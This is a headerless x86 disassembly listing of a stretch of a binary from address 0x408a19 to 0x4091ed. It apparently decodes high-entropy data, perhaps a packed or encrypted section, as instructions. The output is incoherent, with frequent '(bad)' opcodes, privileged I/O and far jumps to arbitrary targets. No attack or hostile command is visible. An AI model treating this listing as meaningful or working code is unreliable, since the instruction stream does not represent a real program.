  408a19:	sbb    bh,BYTE PTR [ecx+0xa8cdbce]
  408a1f:	lea    ecx,[edx-0x2a083b74]
  408a25:	sub    eax,0x40c86c2a
  408a2a:	ds adc eax,0x35d971c5
  408a30:	outs   dx,BYTE PTR ds:[esi]
  408a31:	sbb    ebp,DWORD PTR [esi]
  408a33:	fdivr  QWORD PTR [ebx]
  408a35:	fcomp  QWORD PTR [ecx+0x15]
  408a38:	pop    ebx
  408a39:	xchg   esp,eax
  408a3a:	ins    BYTE PTR es:[edi],dx
  408a3b:	iret   
  408a3c:	or     al,0xe1
  408a3e:	push   ds
  408a3f:	out    0xf4,eax
  408a41:	pop    es
  408a42:	and    edi,DWORD PTR [eax]
  408a44:	mov    eax,ds:0xafaa83b
  408a49:	push   ecx
  408a4a:	xlat   BYTE PTR ds:[ebx]
  408a4b:	inc    ebx
  408a4c:	sbb    DWORD PTR [ebx-0x49e7cccf],ebp
  408a52:	sbb    DWORD PTR [ebx-0x2e7eabe4],edx
  408a58:	mov    al,0x3
  408a5a:	inc    ecx
  408a5b:	mov    bl,0xa3
  408a5d:	pop    edi
  408a5e:	mov    dl,0xbc
  408a60:	add    ah,BYTE PTR [eax+ebp*1+0x25]
  408a64:	aas    
  408a65:	mov    cl,0x24
  408a67:	xor    dh,BYTE PTR [ecx]
  408a69:	pop    esi
  408a6a:	outs   dx,DWORD PTR ds:[esi]
  408a6b:	sub    eax,0x1d521d73
  408a70:	outs   dx,DWORD PTR ds:[esi]
  408a71:	test   esp,edx
  408a73:	sub    al,0xb7
  408a75:	aam    0x83
  408a77:	dec    edi
  408a78:	lock xchg BYTE PTR [edi+0x36a2cf16],ah
  408a7f:	jns    0x408aa1
  408a81:	ret    0xb7e1
  408a84:	jecxz  0x408ad6
  408a86:	call   0x4d86:0x4e1b83b1
  408a8d:	adc    BYTE PTR [ebx-0x4ea8dce6],ah
  408a93:	fnstcw WORD PTR [esp+eax*8-0x7]
  408a97:	fcom   QWORD PTR [edi]
  408a99:	and    eax,0x8af3635b
  408a9e:	jbe    0x408b1f
  408aa0:	bound  esp,QWORD PTR [ecx]
  408aa2:	push   ds
  408aa3:	pop    edx
  408aa4:	add    esi,ecx
  408aa6:	inc    ecx
  408aa7:	cwde   
  408aa8:	push   DWORD PTR ds:0x7b48cb11
  408aae:	xchg   ebx,eax
  408aaf:	xchg   DWORD PTR [ecx+0x8],ebx
  408ab2:	jno    0x408ad4
  408ab4:	inc    esp
  408ab5:	jno    0x408ab1
  408ab7:	adc    DWORD PTR [eax+0x22],0xeed504d8
  408abe:	stos   DWORD PTR es:[edi],eax
  408abf:	pop    ecx
  408ac0:	and    cl,BYTE PTR [ecx-0x7aee5ab4]
  408ac6:	rcl    DWORD PTR [ecx-0xa59b846],0x5e
  408acd:	(bad)  
  408ace:	sub    ebp,DWORD PTR [edi-0x196eb503]
  408ad4:	or     DWORD PTR [ebx],edx
  408ad6:	pop    ebx
  408ad7:	ins    DWORD PTR es:[edi],dx
  408ad8:	fnstenv [esi-0x27387296]
  408ade:	scas   al,BYTE PTR es:[edi]
  408adf:	sub    ebp,edi
  408ae1:	mov    ds:0x6bd2b8de,eax
  408ae6:	adc    bl,dl
  408ae8:	(bad)  
  408ae9:	jge    0x408af7
  408aeb:	hlt    
  408aec:	add    BYTE PTR [edx+0x2f4fd42c],ch
  408af2:	icebp  
  408af3:	aas    
  408af4:	cdq    
  408af5:	in     eax,0x9e
  408af7:	dec    ebp
  408af8:	(bad)  
  408af9:	fsub   QWORD PTR [eax]
  408afb:	fdivp  st(6),st
  408afd:	outs   dx,BYTE PTR ds:[esi]
  408afe:	scas   al,BYTE PTR es:[edi]
  408aff:	je     0x408ad5
  408b01:	ror    DWORD PTR [edi-0x25d007ca],cl
  408b07:	xchg   esi,eax
  408b08:	cmp    esi,DWORD PTR [ebx-0x6b652925]
  408b0e:	mov    al,ds:0x2090c4fe
  408b13:	sbb    DWORD PTR [eax+0x384769ca],ebp
  408b19:	jmp    0x13256a0
  408b1e:	or     DWORD PTR [esi+0x3ce2640d],edi
  408b24:	pmulhw mm5,QWORD PTR [edi-0x44460ed4]
  408b2b:	xlat   BYTE PTR ds:[ebx]
  408b2c:	pop    edi
  408b2d:	enter  0x21a6,0x98
  408b31:	jmp    0x408ba6
  408b33:	mov    ch,0x1f
  408b35:	retf   0xac7
  408b38:	in     al,0xe3
  408b3a:	aaa    
  408b3b:	xchg   ecx,eax
  408b3c:	mov    al,0x35
  408b3e:	daa    
  408b3f:	jnp    0x408b11
  408b41:	cmp    ebx,DWORD PTR [esp+ebx*2+0x1275998]
  408b48:	int    0x3a
  408b4a:	retf   0xc3b1
  408b4d:	iret   
  408b4e:	lea    eax,[ecx]
  408b50:	cmp    eax,0xc0e4f186
  408b55:	out    dx,eax
  408b56:	lods   al,BYTE PTR ds:[esi]
  408b57:	add    ecx,ecx
  408b59:	mov    al,ds:0xfa988207
  408b5e:	lods   eax,DWORD PTR ds:[esi]
  408b5f:	push   0x7c54f9ee
  408b64:	or     DWORD PTR [edi+0x6f],eax
  408b67:	mov    esi,0x59d212fc
  408b6c:	or     esi,DWORD PTR [esi-0x67]
  408b6f:	ins    BYTE PTR es:[edi],dx
  408b70:	lds    ebx,FWORD PTR [ecx+ebx*2-0x3eb36ea1]
  408b77:	lods   eax,DWORD PTR ds:[esi]
  408b78:	add    DWORD PTR [esi],ebx
  408b7a:	mov    eax,0xd4ab2ef1
  408b7f:	daa    
  408b80:	dec    ebp
  408b81:	fild   QWORD PTR [ebp+0x2a5f6f06]
  408b87:	mov    dh,0x7a
  408b89:	pop    es
  408b8a:	out    0xd7,eax
  408b8c:	xchg   edx,eax
  408b8e:	xchg   esp,eax
  408b8f:	imul   edx,DWORD PTR [edi],0x78385a17
  408b95:	mul    DWORD PTR [ecx+0x2b9c10ec]
  408b9b:	mov    BYTE PTR [edi],0xae
  408b9e:	jae    0x408b76
  408ba0:	or     dl,BYTE PTR [esi]
  408ba2:	adc    DWORD PTR [eax+0x3b3db1cc],eax
  408ba8:	fistp  WORD PTR [esi+edi*8]
  408bab:	loopne 0x408c13
  408bad:	int    0x12
  408baf:	out    0x68,eax
  408bb1:	pushf  
  408bb2:	loop   0x408b83
  408bb4:	inc    edx
  408bb5:	out    dx,eax
  408bb6:	xor    al,0x2b
  408bb8:	div    DWORD PTR [edx]
  408bba:	into   
  408bbb:	cmp    BYTE PTR [edi+0x3c],bh
  408bbe:	sbb    eax,0x566e88aa
  408bc3:	inc    ebx
  408bc4:	pusha  
  408bc5:	ins    DWORD PTR es:[edi],dx
  408bc6:	sub    ch,0x65
  408bc9:	add    ch,BYTE PTR [ebx]
  408bcb:	nop
  408bcc:	jae    0x408b72
  408bce:	xor    eax,0x1cf02d54
  408bd3:	xchg   edx,eax
  408bd4:	call   0x7599:0x5ca8c72b
  408bdb:	mov    ebp,0xa9fb47c4
  408be0:	adc    DWORD PTR [ecx],0x13ffaa00
  408be6:	pop    es
  408be7:	mov    bh,0x69
  408be9:	test   DWORD PTR [ecx],ebx
  408beb:	add    ch,ah
  408bed:	jo     0x408b97
  408bef:	(bad)  
  408bf0:	sti    
  408bf1:	cmp    al,0xa1
  408bf3:	ret    0xc42b
  408bf6:	adc    edi,DWORD PTR [edx+0x60]
  408bf9:	shl    BYTE PTR [edx],0x7d
  408bfc:	jne    0x408ba7
  408bfe:	mov    bh,0xa
  408c00:	sub    DWORD PTR [ebx+0x23],eax
  408c03:	xchg   DWORD PTR [esi],ebx
  408c05:	leave  
  408c06:	or     DWORD PTR [ebp+0x646baccb],ebx
  408c0c:	popa   
  408c0d:	sub    ebp,DWORD PTR [edi+0x25aa4c12]
  408c13:	push   eax
  408c14:	mov    ecx,0xd23628c9
  408c19:	inc    edx
  408c1a:	and    edi,DWORD PTR [ebp+0x42bc6351]
  408c20:	mov    ebx,0x2be7a8dd
  408c25:	pop    ecx
  408c26:	inc    ebx
  408c27:	push   0x86354ebe
  408c2c:	mov    ebx,0xf6b0667f
  408c31:	test   eax,0x7cf3920f
  408c36:	push   0xa689bf17
  408c3b:	cs mov dh,0x3f
  408c3e:	add    DWORD PTR [esp+eax*8-0x70],ecx
  408c42:	lea    ecx,[ebx+0x558be045]
  408c48:	clc    
  408c49:	mov    edi,DWORD PTR [ebp-0x24]
  408c4c:	xor    edx,ecx
  408c4e:	jmp    0x408fc4
  408c53:	inc    esp
  408c54:	pusha  
  408c55:	sub    BYTE PTR [esi],bh
  408c57:	sub    BYTE PTR [esi+0x72],dl
  408c5a:	(bad)
  408c5f:	xor    DWORD PTR [ebp-0x1b934de4],ebx
  408c65:	jl     0x408ce3
  408c67:	xlat   BYTE PTR ds:[ebx]
  408c68:	jns    0x408ce6
  408c6a:	jl     0x408c6d
  408c6c:	std    
  408c6d:	ret    0x99af
  408c70:	outs   dx,BYTE PTR ds:[esi]
  408c71:	mov    edi,0x58bbf41a
  408c76:	outs   dx,DWORD PTR ds:[esi]
  408c77:	cmp    DWORD PTR [edx+0x12],eax
  408c7a:	ss inc edi
  408c7c:	cld    
  408c7d:	pop    ss
  408c7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c7f:	and    DWORD PTR [ebx+0x2ec14b9],esi
  408c85:	in     al,dx
  408c86:	jmp    FWORD PTR [edx-0x7c]
  408c89:	mov    edi,0x6be4ab90
  408c8e:	mov    ch,0x41
  408c90:	imul   eax,DWORD PTR [edx+eax*8],0xffffffb5
  408c94:	in     eax,0x57
  408c96:	in     al,dx
  408c97:	cmp    BYTE PTR [ecx+ecx*2-0x6b],ah
  408c9b:	cdq    
  408c9c:	push   ds
  408c9d:	xchg   edx,eax
  408c9e:	(bad)  
  408ca0:	inc    ebx
  408ca1:	fdivr  DWORD PTR [eax+ebx*8]
  408ca4:	iret   
  408ca5:	rol    BYTE PTR [edi+0x5e],cl
  408ca8:	sahf   
  408ca9:	je     0x408c76
  408cab:	jmp    0x408d1b
  408cad:	mov    eax,ds:0xb3edd438
  408cb2:	xchg   edi,eax
  408cb3:	push   edx
  408cb4:	inc    esi
  408cb5:	jae    0x408c3f
  408cb7:	inc    edx
  408cb8:	sbb    bl,BYTE PTR ds:0xdcd9a1ff
  408cbe:	adc    edx,DWORD PTR [edx]
  408cc0:	sub    BYTE PTR [ecx+0x20],ch
  408cc3:	push   edx
  408cc4:	(bad)  
  408cc5:	daa    
  408cc6:	bound  ebp,QWORD PTR ds:0x5792d7fe
  408ccc:	clc    
  408ccd:	mov    ch,0xa5
  408ccf:	jge    0x408d0d
  408cd1:	adc    eax,0x758e65f0
  408cd6:	mov    edx,0xaeb93530
  408cdb:	int3   
  408cdc:	jl     0x408d04
  408cde:	inc    ebp
  408cdf:	int    0x66
  408ce1:	lds    eax,FWORD PTR [esi-0x37]
  408ce4:	dec    eax
  408ce5:	mov    bh,0xa5
  408ce7:	push   ss
  408ce8:	jo     0x408d27
  408cea:	add    ecx,DWORD PTR [edx-0x74a447fb]
  408cf0:	mov    bh,0xe7
  408cf2:	call   0xb5e32195
  408cf7:	adc    al,0xe0
  408cf9:	pop    ds
  408cfa:	pushf  
  408cfb:	xchg   edi,eax
  408cfc:	outs   dx,DWORD PTR ds:[esi]
  408cfd:	repnz outs dx,DWORD PTR ds:[esi]
  408cff:	or     ebx,0x38
  408d02:	xchg   BYTE PTR [ebp+0x5679dc99],ch
  408d08:	xor    eax,0xcc10616f
  408d0d:	(bad)  
  408d0e:	aad    0xd8
  408d10:	adc    eax,0xdea956f6
  408d15:	adc    DWORD PTR [ebp+0x74a34ec3],esp
  408d1b:	mov    eax,ds:0xce24956a
  408d20:	mov    edi,0xf6c744ec
  408d25:	in     al,dx
  408d26:	out    0x31,eax
  408d28:	cmp    ah,BYTE PTR [eax+0x11]
  408d2b:	cmp    eax,0xe868c1a5
  408d30:	addr16 in eax,dx
  408d32:	sbb    DWORD PTR [eax-0x8],0x2e
  408d36:	addr16 mov bl,0xe1
  408d39:	test   bl,ch
  408d3b:	push   edi
  408d3c:	cmc    
  408d3d:	xchg   ebx,eax
  408d3e:	enter  0xbf5d,0xfa
  408d42:	fcmovbe st,st(1)
  408d44:	xor    eax,0x56efa542
  408d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d4a:	and    eax,0x38591f67
  408d4f:	retf   0xc5b4
  408d52:	sahf   
  408d53:	(bad)  
  408d54:	sbb    eax,DWORD PTR [eax+eiz*2+0x56]
  408d58:	loope  0x408d48
  408d5a:	dec    DWORD PTR [edx+0x28]
  408d5d:	ret    
  408d5e:	xchg   edi,eax
  408d5f:	jg     0x408d2c
  408d61:	call   0x7a9339d2
  408d66:	arpl   cx,sp
  408d68:	out    dx,eax
  408d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d6a:	in     al,0xc5
  408d6c:	or     edx,DWORD PTR [edx-0x3c]
  408d6f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d71:	and    al,0x5f
  408d73:	xor    eax,0xc3f328a
  408d78:	sub    cl,0x8a
  408d7b:	sub    eax,0x3ab390ff
  408d80:	stc    
  408d81:	call   0x193a:0x9c6057ff
  408d88:	add    DWORD PTR [eax-0x15],edi
  408d8b:	rol    DWORD PTR [edi],cl
  408d8d:	jb     0x408db1
  408d8f:	mov    edx,0x8b23d5b6
  408d94:	loope  0x408d27
  408d96:	xchg   edx,eax
  408d97:	test   eax,0x8e0fada4
  408d9c:	xchg   BYTE PTR [ebx+0x2e],bl
  408d9f:	sub    DWORD PTR [ecx+0x40],ebp
  408da2:	jl     0x408d83
  408da4:	inc    ecx
  408da5:	cmp    BYTE PTR [edx+0x3d],bl
  408da8:	fwait
  408da9:	mov    al,0x15
  408dab:	xchg   ecx,eax
  408dac:	(bad)  
  408dad:	pop    edi
  408dae:	inc    edx
  408daf:	out    0x30,al
  408db1:	lods   al,BYTE PTR ds:[esi]
  408db2:	aas    
  408db3:	shl    BYTE PTR [edi+0x32c318f],1
  408db9:	nop
  408dba:	add    bh,BYTE PTR [edx-0x7e97623b]
  408dc0:	sar    DWORD PTR [edx],1
  408dc2:	out    0xb8,al
  408dc4:	ret    0xc8c4
  408dc7:	js     0x408dce
  408dc9:	push   0xd0264f54
  408dce:	cmp    al,0x3c
  408dd0:	push   esp
  408dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dd2:	cmc    
  408dd3:	mov    ebx,0x8dd7f52b
  408dd8:	sub    eax,0x738c626
  408ddd:	adc    al,0xf9
  408ddf:	inc    edi
  408de0:	aaa    
  408de1:	enter  0xe852,0x96
  408de5:	lock and ebp,DWORD PTR [ecx+eax*2-0x79844f6d]
  408ded:	xor    eax,0xdb06c8f9
  408df2:	(bad)  
  408df3:	fld    TBYTE PTR es:[ebx+ebp*8+0x31944406]
  408dfb:	pushf  
  408dfc:	lods   al,BYTE PTR ds:[esi]
  408dfd:	xor    dh,BYTE PTR [esi-0x42]
  408e00:	in     eax,0xe7
  408e02:	push   edi
  408e03:	pop    esp
  408e04:	dec    eax
  408e05:	out    dx,al
  408e06:	push   edx
  408e07:	jmp    0xd576ab20
  408e0c:	call   0x13d7e8ce
  408e11:	cmp    al,dl
  408e13:	jns    0x408e5f
  408e15:	pop    esi
  408e16:	ins    DWORD PTR es:[edi],dx
  408e17:	cs enter 0x7db3,0x94
  408e1c:	fisubr WORD PTR [eax]
  408e1e:	xchg   ebx,eax
  408e1f:	cwde   
  408e20:	pop    ss
  408e21:	jl     0x408de0
  408e23:	sbb    BYTE PTR [edi],al
  408e25:	std    
  408e26:	pusha  
  408e27:	lds    ebx,FWORD PTR [ebp+0x4]
  408e2a:	cwde   
  408e2b:	call   0x31db:0xb5b3cb9a
  408e32:	mov    ah,0xf
  408e34:	or     eax,0x825c577b
  408e39:	pop    esp
  408e3a:	xor    dl,BYTE PTR [ecx+0x5d]
  408e3d:	xor    BYTE PTR [edi+0x5e6232fa],0x43
  408e44:	and    eax,0xb244c87
  408e49:	mov    dl,0xf7
  408e4b:	mov    ch,0x51
  408e4d:	sbb    eax,0xb7b8942
  408e52:	mul    ah
  408e54:	jl     0x408e5f
  408e56:	mov    bl,0x1
  408e58:	jg     0x408ebb
  408e5a:	cmp    BYTE PTR [esi+ebx*2],dh
  408e5d:	xchg   esp,eax
  408e5e:	test   eax,0x7b14882f
  408e63:	lock jmp 0xf92fe23a
  408e69:	add    al,0xc
  408e6b:	imul   ecx,DWORD PTR es:[edi],0x7a3a1623
  408e72:	sbb    DWORD PTR [edi-0x30],edi
  408e75:	je     0x408ee3
  408e77:	push   ebx
  408e78:	fwait
  408e79:	ret    
  408e7a:	js     0x408e46
  408e7c:	addr16 mov ds:0x6ff8,al
  408e80:	push   ebx
  408e81:	sub    dh,ah
  408e83:	sbb    al,0x94
  408e85:	jl     0x408e2f
  408e87:	cmp    edx,ecx
  408e89:	xlat   BYTE PTR ds:[ebx]
  408e8a:	pop    esp
  408e8b:	das    
  408e8c:	lock push es
  408e8e:	mov    bh,0xd2
  408e90:	mov    edx,0x6f1527fd
  408e95:	mov    ecx,0x48baf94f
  408e9a:	test   BYTE PTR [ebx-0x581f6e84],cl
  408ea0:	ds mov al,0x48
  408ea3:	dec    ebp
  408ea4:	mov    eax,0x352d1145
  408ea9:	xchg   edx,eax
  408eaa:	outs   dx,DWORD PTR ds:[esi]
  408eab:	mov    ds:0xc26e62c6,eax
  408eb0:	rcl    BYTE PTR [eax-0x42871943],cl
  408eb6:	mov    dh,0x59
  408eb8:	add    DWORD PTR ds:0x2d2cb293,eax
  408ebe:	fwait
  408ebf:	pusha  
  408ec0:	(bad)  
  408ec1:	adc    ecx,DWORD PTR [ebp-0x7e62678f]
  408ec7:	mul    esp
  408ec9:	aaa    
  408eca:	sub    ah,ah
  408ecc:	or     eax,0xdeb89003
  408ed1:	cmp    edi,edx
  408ed3:	dec    ebx
  408ed4:	sub    ecx,DWORD PTR [edx-0x19]
  408ed7:	pop    eax
  408ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ed9:	cmp    DWORD PTR [eax],0xffffff9d
  408edc:	shl    BYTE PTR [edi+0x753c779f],cl
  408ee2:	lahf   
  408ee3:	adc    eax,0x7aec254c
  408ee8:	das    
  408ee9:	cmp    eax,0xb2cbe177
  408eee:	pop    edi
  408eef:	or     DWORD PTR [eax],0x88e0d2d
  408ef5:	in     eax,dx
  408ef6:	out    dx,al
  408ef7:	pop    ebx
  408ef8:	lds    edx,FWORD PTR ds:[edx+0x791fdfe0]
  408eff:	loop   0x408ee3
  408f01:	fist   DWORD PTR [eax+eiz*4]
  408f04:	test   al,0x46
  408f06:	shr    al,1
  408f08:	jmp    0xbd30:0x9cc1a1e8
  408f0f:	inc    ebx
  408f10:	mov    eax,0x24d7fef7
  408f15:	call   0xfe62c7cf
  408f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f1b:	jb     0x408f47
  408f1d:	leave  
  408f1e:	aam    0x7c
  408f20:	leave  
  408f21:	ret    
  408f22:	and    eax,0xd8854ffe
  408f27:	jae    0x408ef0
  408f29:	popa   
  408f2a:	nop
  408f2b:	jmp    0xd1e2:0xeb4cfdca
  408f32:	dec    ecx
  408f33:	sub    ah,bl
  408f35:	fcmovbe st,st(2)
  408f37:	ret    
  408f38:	pop    ebp
  408f39:	cmp    dh,ch
  408f3b:	adc    eax,0x4750fd1f
  408f40:	(bad)  
  408f41:	dec    ebp
  408f42:	iret   
  408f43:	dec    edi
  408f44:	ret    0x410a
  408f47:	test   eax,0xef5e735f
  408f4c:	jne    0x408edb
  408f4e:	xor    BYTE PTR [ecx+0x3c],0x7f
  408f52:	pop    ecx
  408f53:	loope  0x408fab
  408f55:	jmp    0xc1ca:0x133150a7
  408f5c:	fcom   QWORD PTR [edx+0x4199b6a4]
  408f62:	mov    ebx,0x2c0b0ebd
  408f67:	adc    bh,BYTE PTR [ebp-0x73]
  408f6a:	jno    0x408fbc
  408f6c:	daa    
  408f6d:	fist   DWORD PTR [edx-0x4c]
  408f70:	dec    esi
  408f71:	xchg   edi,eax
  408f72:	xor    esi,eax
  408f74:	fld    TBYTE PTR [edx-0x15caa888]
  408f7a:	inc    esp
  408f7b:	(bad)  
  408f7c:	call   0x480a:0x1d73b578
  408f83:	aas    
  408f84:	enter  0x1a99,0x50
  408f88:	bnd jp 0x409007
  408f8b:	jae    0x408f7f
  408f8d:	and    BYTE PTR [edx],0x2a
  408f90:	lods   al,BYTE PTR ds:[esi]
  408f91:	or     DWORD PTR [edi+0x3c6fff39],eax
  408f97:	fadd   st(5),st
  408f99:	mov    dh,0xe1
  408f9b:	mov    bl,0x5a
  408f9d:	pop    esp
  408f9e:	rol    DWORD PTR [ecx],1
  408fa0:	stos   BYTE PTR es:[edi],al
  408fa1:	mov    eax,0xa6887d0f
  408fa6:	sub    DWORD PTR [ebp-0x51],ebx
  408fa9:	mov    ds:0x89a83859,al
  408fae:	sub    DWORD PTR [edi],edx
  408fb0:	dec    ecx
  408fb1:	xor    BYTE PTR [ecx],dh
  408fb3:	cmp    dl,BYTE PTR [eax]
  408fb5:	xchg   ebx,eax
  408fb6:	xchg   esi,eax
  408fb7:	dec    ecx
  408fb8:	ins    BYTE PTR es:[edi],dx
  408fb9:	shl    BYTE PTR [ebp-0x1af14396],1
  408fbf:	xchg   BYTE PTR [edx],al
  408fc1:	and    eax,0xd603e9ac
  408fc6:	imul   edx,edi
  408fc9:	sub    DWORD PTR [eax],edx
  408fcb:	jmp    0x409341
  408fd0:	or     eax,0x738240b6
  408fd5:	jb     0x408fa4
  408fd7:	mov    cl,0xfd
  408fd9:	push   eax
  408fda:	sbb    DWORD PTR [edx+esi*4+0x52],ebp
  408fde:	adc    dl,dh
  408fe0:	(bad)  
  408fe1:	loopne 0x40905f
  408fe3:	jl     0x408fbc
  408fe5:	jns    0x409063
  408fe7:	jl     0x409035
  408fe9:	cmp    al,0xa6
  408feb:	test   DWORD PTR [edx],ebp
  408fed:	push   edx
  408fee:	not    DWORD PTR [esi]
  408ff0:	xor    eax,0xb12209d6
  408ff5:	enter  0xb10,0x44
  408ff9:	ja     0x409012
  408ffb:	mov    ah,BYTE PTR [edx+0x17c6d3a8]
  409001:	daa    
  409002:	gs in  eax,0x97
  409005:	add    eax,0x82aba3cd
  40900a:	imul   edx,DWORD PTR [ebp-0x11],0xd
  40900e:	mov    DWORD PTR [edx-0x4d1a8f92],esi
  409014:	stc    
  409015:	dec    edx
  409016:	push   ss
  409017:	sbb    bl,al
  409019:	mov    bl,0x3f
  40901b:	sbb    eax,0xb58a048a
  409020:	fimul  WORD PTR [edx]
  409022:	dec    ebp
  409023:	test   al,0x68
  409025:	lods   al,BYTE PTR ds:[esi]
  409026:	push   esp
  409027:	out    0x0,al
  409029:	add    ecx,DWORD PTR [ebp-0x22d21cf7]
  40902f:	cdq    
  409030:	lahf   
  409031:	lds    edi,FWORD PTR [esi+0x15]
  409034:	push   ecx
  409036:	stc    
  409037:	cmp    dl,BYTE PTR [edx]
  409039:	(bad)  
  40903a:	sti    
  40903b:	cld    
  40903c:	lock xor al,al
  40903f:	in     al,dx
  409040:	outs   dx,BYTE PTR ds:[esi]
  409041:	mov    DWORD PTR [edx],eax
  409043:	sub    al,0x19
  409045:	outs   dx,DWORD PTR ds:[esi]
  409046:	stc    
  409047:	xor    BYTE PTR [eax+0x7401f2e8],ch
  40904d:	sub    eax,0x384b3b0c
  409052:	jnp    0x40904c
  409054:	aam    0x41
  409056:	jmp    0x40906b
  409058:	and    DWORD PTR [edi+0x22],esp
  40905b:	cmp    DWORD PTR [ebx+0x1c],esi
  40905e:	sbb    DWORD PTR [esi-0x3d8e12ed],0xbc4d07bd
  409068:	inc    esi
  409069:	pusha  
  40906a:	mov    edi,gs
  40906c:	mov    ebx,0x182c5795
  409071:	mov    DWORD PTR [edi],edi
  409073:	cmp    BYTE PTR [edx-0x64],dl
  409076:	or     BYTE PTR [esp+edx*1-0x5a5424e9],cl
  40907d:	shl    BYTE PTR [eax],cl
  40907f:	jns    0x409035
  409081:	xor    BYTE PTR [eax-0x5e],al
  409084:	lods   eax,DWORD PTR ds:[esi]
  409085:	dec    eax
  409086:	pop    ds
  409087:	mov    al,0xce
  409089:	scas   eax,DWORD PTR es:[edi]
  40908a:	pushf  
  40908b:	mov    al,0x16
  40908d:	mov    BYTE PTR [edi+0x356d4150],dl
  409093:	push   cs
  409094:	shl    eax,0xd4
  409097:	lahf   
  409098:	cmp    edx,DWORD PTR [edx+0x4f]
  40909b:	pop    ds
  40909c:	sbb    eax,0x10bdc3d1
  4090a1:	pop    ds
  4090a2:	retf   0xd5aa
  4090a5:	pop    ebp
  4090a6:	pop    ss
  4090a7:	push   edx
  4090a8:	mov    ds:0x305d43de,al
  4090ad:	xor    al,0x92
  4090af:	(bad)  
  4090b0:	sti    
  4090b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090b2:	ror    DWORD PTR [ebx+0x41076594],1
  4090b8:	shr    DWORD PTR [ebx-0x1b],0xa1
  4090bc:	pop    ecx
  4090bd:	rcr    DWORD PTR [esi-0x7d76c436],1
  4090c3:	mov    bl,0x10
  4090c5:	clc    
  4090c6:	and    BYTE PTR [esi-0x64],0x4e
  4090ca:	std    
  4090cb:	xchg   esi,eax
  4090cc:	lods   eax,DWORD PTR ds:[esi]
  4090cd:	push   ss
  4090ce:	xchg   esp,eax
  4090cf:	xchg   esi,eax
  4090d0:	loop   0x4090a4
  4090d2:	or     al,0x7a
  4090d4:	test   DWORD PTR [esp+eax*1],esi
  4090d7:	enter  0x29c,0x9f
  4090db:	or     BYTE PTR [ebx-0x4623abe7],bh
  4090e1:	adc    cl,0x7d
  4090e4:	cmp    ecx,DWORD PTR [edx]
  4090e6:	add    eax,0xf9b19f69
  4090eb:	pop    eax
  4090ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090ed:	scas   al,BYTE PTR es:[edi]
  4090ee:	mov    edx,0x3a336c8e
  4090f3:	daa    
  4090f4:	jae    0x409114
  4090f6:	aaa    
  4090f7:	ja     0x40914e
  4090f9:	(bad)  
  4090fa:	xor    al,0xc0
  4090fc:	adc    al,0x76
  4090fe:	push   ss
  4090ff:	and    BYTE PTR ds:0x9c132455,al
  409105:	fcmovne st,st(0)
  409107:	rcl    BYTE PTR [eax],cl
  409109:	sbb    ch,BYTE PTR [esi+0x2d]
  40910c:	pusha  
  40910d:	xchg   esp,eax
  40910e:	jecxz  0x40915e
  409110:	sbb    BYTE PTR [edi-0x3ecd9713],cl
  409116:	mov    edx,0xc0d8fe66
  40911b:	pop    edi
  40911c:	test   eax,0xa56ec380
  409121:	fidiv  DWORD PTR [bp+si-0x58d6]
  409126:	test   BYTE PTR [esi+0x54],0x31
  40912a:	push   ds
  40912b:	jp     0x409177
  40912d:	es ins BYTE PTR es:[edi],dx
  40912f:	(bad)
  409133:	sahf   
  409134:	xlat   BYTE PTR ds:[ebx]
  409135:	stos   DWORD PTR es:[edi],eax
  409136:	stos   BYTE PTR es:[edi],al
  409137:	cmp    ah,BYTE PTR cs:[edi+0x55]
  40913b:	imul   ecx,DWORD PTR [esi+0x20e452d8],0x23
  409142:	lea    edx,[ebx-0x1c]
  409145:	aam    0xcc
  409147:	shl    DWORD PTR [ebp-0x3fce689c],1
  40914d:	or     eax,0x4f0f9d86
  409152:	xchg   ecx,eax
  409153:	(bad)
  409158:	sahf   
  409159:	inc    eax
  40915a:	mov    al,ds:0x60f02078
  40915f:	sub    cl,BYTE PTR [eax-0x19a0dbc1]
  409165:	test   ecx,0x551c1dbf
  40916b:	add    bl,BYTE PTR [eax+0x45d757de]
  409171:	enter  0xdfa0,0x3
  409175:	rcr    BYTE PTR [esi-0x7e],cl
  409178:	je     0x409154
  40917a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40917b:	lahf   
  40917c:	test   BYTE PTR [ecx],ch
  40917e:	pop    eax
  40917f:	rcr    BYTE PTR [ecx],cl
  409181:	xor    ebx,DWORD PTR [esi+0x684bc1f3]
  409187:	dec    ebp
  409188:	jbe    0x409203
  40918a:	push   ds
  40918b:	jecxz  0x4091dd
  40918d:	shl    DWORD PTR [ecx+0x5bf3ebd3],cl
  409193:	in     eax,dx
  409194:	into   
  409195:	inc    edi
  409196:	stc    
  409197:	stos   BYTE PTR es:[edi],al
  409198:	es out 0x77,al
  40919b:	mov    eax,ds:0x62906107
  4091a0:	inc    esi
  4091a1:	push   ss
  4091a2:	adc    BYTE PTR [ecx],cl
  4091a4:	fisub  DWORD PTR [eax]
  4091a6:	repz adc edx,DWORD PTR [ecx+0x0]
  4091aa:	lock ss xor ebp,esp
  4091ae:	or     ch,0x5d
  4091b1:	cmc    
  4091b2:	inc    esp
  4091b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091b4:	stos   BYTE PTR es:[edi],al
  4091b5:	and    DWORD PTR [edx-0x68],0x56e87f9e
  4091bc:	jl     0x4091da
  4091be:	xchg   ebx,eax
  4091bf:	sbb    eax,0xae3a1582
  4091c4:	dec    edx
  4091c5:	mov    esp,0x68a8541c
  4091ca:	add    BYTE PTR [ecx-0x5e],ch
  4091cd:	test   al,0x4f
  4091cf:	ret    0x6744
  4091d2:	sub    DWORD PTR [ebp+0xe],0x5690fd2f
  4091d9:	add    esp,ebx
  4091db:	or     al,0xf8
  4091dd:	and    BYTE PTR [edx],0xf2
  4091e0:	jge    0x4091a3
  4091e2:	fistp  DWORD PTR [ebx-0x39]
  4091e5:	scas   al,BYTE PTR es:[edi]
  4091e6:	aad    0xa0
  4091e8:	adc    al,0xa2
  4091ea:	ficom  DWORD PTR [edx+eiz*2]
  4091ed:	ss push eax
